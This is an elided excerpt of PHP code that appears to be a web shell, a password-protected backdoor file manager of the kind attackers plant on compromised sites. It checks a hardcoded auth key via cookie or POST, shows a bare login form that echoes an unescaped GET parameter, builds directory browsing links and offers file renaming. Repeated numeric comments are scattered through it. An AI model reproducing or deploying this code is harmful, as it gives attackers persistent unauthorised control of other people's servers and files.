...
$auth_key = "df9a097cb6ae1fb3d26082c07f9470ba";
...
$pass = false;
if (isset($_COOKIE['pw_name_10136'])) {
    if(($_COOKIE['pw_name_10136']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_10136'])) {
        if(($_POST['pw_name_10136']) == $auth_key) {
            setcookie("pw_name_10136", $_POST['pw_name_10136']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_10136' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1724018475381326 1724018475651960 1724018475531305 1724018475627966
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1724018475381326 1724018475651960 1724018475531305 1724018475627966
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1724018475381326 1724018475651960 1724018475531305 1724018475627966
            $name = PATH . "/" . $_GET['r'];
